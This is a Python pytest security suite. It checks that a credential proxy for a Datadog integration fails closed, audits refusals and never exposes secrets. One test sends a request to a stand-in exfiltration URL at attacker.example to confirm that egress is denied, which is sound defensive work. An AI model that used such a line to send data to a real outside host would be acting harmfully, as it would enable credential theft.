"""SC-005. Take the proxy away and the capability must fail, not improvise.

FR-010 forbids a bypass, and a forbidden thing has to be tested by trying it.
Three ways of taking the proxy away — unreachable, unconfigured for this tenant,
and refusing the host — and in each the assertion is the same shape: the call
fails with a structured error naming the integration, and no request reached the
vendor without a credential.

The failure mode this guards against is not a deliberate bypass flag. It is the
`except` clause somebody adds during an outage that falls back to an
unauthenticated call, gets a 200 with an empty body, and turns a broken
integration into an investigation that quietly finds nothing.
"""

from __future__ import annotations

import pytest

from core.capability.result import CapabilityErrorClass
from integrations._base.errors import IntegrationError, IntegrationErrorReason
from platform.credentials.handles import CredentialHandle
from platform.credentials.proxy.errors import ProxyErrorReason
from tests.security.conftest import (
    ORG_ID,
    ProxyStack,
    RecordingSender,
    build_stack,
    seed_sentinel,
)

pytestmark = pytest.mark.security


async def test_an_unreachable_vendor_fails_the_capability(stack: ProxyStack) -> None:
    stack.sender.failures.append(ConnectionError("connection refused"))

    with pytest.raises(IntegrationError) as raised:
        await stack.client().get("/api/v2/logs/events", params={"query": "*"})

    assert raised.value.integration == "datadog"
    assert raised.value.reason is IntegrationErrorReason.PROXY_UNAVAILABLE
    assert "datadog" in str(raised.value)


async def test_a_tenant_without_the_credential_gets_a_structured_error() -> None:
    """Nothing seeded: the proxy must refuse rather than call unauthenticated."""
    unseeded = await build_stack()

    with pytest.raises(IntegrationError) as raised:
        await unseeded.client().get("/api/v2/logs/events", params={"query": "*"})

    assert raised.value.reason is IntegrationErrorReason.CREDENTIAL_UNAVAILABLE
    assert raised.value.proxy_reason is ProxyErrorReason.CREDENTIAL_NOT_CONFIGURED
    assert "datadog" in str(raised.value)
    assert unseeded.sender.sent == [], "an unauthenticated request left for the vendor"


async def test_a_failed_resolution_becomes_a_capability_error(stack: ProxyStack) -> None:
    """FR-012: the agent sees a classified result, not a traceback."""
    empty = await build_stack()

    with pytest.raises(IntegrationError) as raised:
        await empty.client().get("/api/v2/logs/events", params={"query": "*"})

    error = raised.value.to_capability_error()
    assert error.classification is CapabilityErrorClass.PERMISSION_DENIED
    assert "datadog" in error.message
    assert not error.retryable


async def test_an_undeclared_host_is_refused_before_any_credential_is_read() -> None:
    """The allow-list runs first, so a redirected client never touches the vault."""
    stack = await build_stack(sender=RecordingSender())
    await seed_sentinel(stack)

    with pytest.raises(IntegrationError) as raised:
        await stack.client().request("GET", "https://attacker.example/collect")

    assert raised.value.proxy_reason is ProxyErrorReason.EGRESS_DENIED
    assert stack.sender.sent == []


async def test_there_is_no_configuration_that_returns_a_credential(stack: ProxyStack) -> None:
    """FR-010, stated as an absence the vault's own surface has to keep.

    The vault is what an operator, a console, or a CLI holds. If it grew a
    method that returned a value, every argument about where credentials cannot
    reach would be one import away from being false.
    """
    handle = CredentialHandle(integration="datadog", team_id="payments")
    version = await stack.vault.active(stack.scope, handle)

    assert version is not None
    assert version.version == 1
    assert not any(
        name.startswith(("reveal", "decrypt", "value", "secret"))
        for name in dir(stack.vault)
        if not name.startswith("_")
    ), "the vault grew a method that returns credential material"


async def test_the_proxy_records_the_refusal(stack: ProxyStack) -> None:
    """A denied resolution is still an audited one (FR-019)."""
    empty = await build_stack()

    with pytest.raises(IntegrationError):
        await empty.client().get("/api/v2/logs/events", params={"query": "*"})

    async with empty.gateway.begin(empty.scope) as uow:
        events = await uow.audit.query(limit=10)

    assert len(events) == 1
    assert events[0].detail["integration"] == "datadog"
    assert events[0].detail["reason"] == ProxyErrorReason.CREDENTIAL_NOT_CONFIGURED
    assert events[0].actor_id == ORG_ID
